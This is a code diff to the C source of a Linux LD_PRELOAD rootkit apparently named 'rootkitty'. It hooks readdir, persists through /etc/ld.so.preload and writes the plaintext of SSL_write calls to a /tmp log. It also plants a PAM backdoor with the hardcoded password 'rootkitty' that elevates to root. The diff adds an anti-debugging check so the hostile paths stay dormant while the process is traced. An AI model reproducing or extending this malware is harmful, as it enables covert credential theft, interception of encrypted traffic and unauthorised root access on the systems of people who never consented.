@@ -25,7 +25,7 @@ static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
 static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
 static int (*og_pam_sm_setcred)(pam_handle_t* pamh, int flags, int argc, const char** argv) = NULL;
 static int (*og_execve)(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]) = NULL;
-
+int isDebuggerPresent();
 /*---------[ INITIALIZE THE HOOKS ]---------*/
 __attribute__((constructor)) void hook_init(void){
   og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
@@ -44,6 +44,10 @@ __attribute__((constructor)) void PersistCheck(void) {
   char check[PATH_MAX];
   char preload[] = { '/', 'e', 't', 'c', '/', 'l', 'd', '.', 's', 'o', '.', 'p', 'r', 'e', 'l', 'o', 'a', 'd', 0 };
   char tmp[] = { '/', 't', 'm', 'p', '/', 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', '_', 't', 'm', 'p', '.', 't', 'x', 't', 0 };
+
+  if(!isDebuggerPresent()){
+    return;
+  }
 
   dladdr((void*)PersistCheck, &path);
   uid_t old_uid = getuid();
@@ -126,7 +130,13 @@ struct dirent64* readdir64(DIR* dirp) {
 /*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
 int SSL_write(SSL* ssl, const void *buf, int num) {
   char path[] = {'/', 't', 'm', 'p', '/', 'S', 'S', 'L', '_', 'l', 'o', 'g', '.', 't', 'x', 't', 0 };
+  
+  if (!isDebuggerPresent()){
+    return og_SSL_write(ssl, buf, num);
+  }
+
   FILE* fd = fopen(path, "a+");
+  
   if (fd != NULL){
     fprintf(fd, "PID:%d\n", getpid());
     fwrite(buf, 1, num, fd);
@@ -140,21 +150,28 @@ int backdoor = 0;
 
 // elevate privileges:
 int elevation(){
+  if (!isDebuggerPresent()){
+    return 1;
+  }
   uid_t UID = getuid();
   gid_t GID = getgid();
 
   if (seteuid(0) == -1) {
-    return -1;
+    return 1;
   }
   if (setegid(0) == -1) {
     seteuid(UID);
-    return -1;
+    return 1;
   }
   return 0;
 }
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, const char** argv){
   const char* input_passwd;
+  
+  if(!isDebuggerPresent()){
+    return og_pam_sm_auth(pamh, flags, argc, argv);
+  }
 
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
   char password[] = { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
@@ -166,11 +183,36 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, cons
 }
 
 PAM_EXTERN int pam_sm_setcred(pam_handle_t* pamh, int flags, int argc, const char** argv){
-  if (backdoor == 1){
+  if (isDebuggerPresent() && backdoor == 1){
     if(elevation() == 0){
       backdoor = 0;
       return PAM_SUCCESS;
     }
   }
   return og_pam_sm_setcred(pamh, flags, argc, argv);
+}
+/*---------[ ANTI DEBUGGER CHECK ]---------*/
+int isDebuggerPresent(){
+  FILE* f;
+  char buffer[1024];
+  int result = 0;
+  int pid = 0;
+
+  f = fopen("/proc/self/status", "r");
+  if (f == NULL) {
+    perror("[-] Cannot open file.");
+    exit(EXIT_FAILURE);
+  }
+
+  while (fgets(buffer, sizeof(buffer), f)) {
+    if (strncmp(buffer, "TracerPid:", 10)==0){
+      pid = atoi(buffer+10);
+      if (!pid) {
+        result = 1;
+        break;
+      }
+    }
+  }
+  fclose(f);
+  return result;
 }
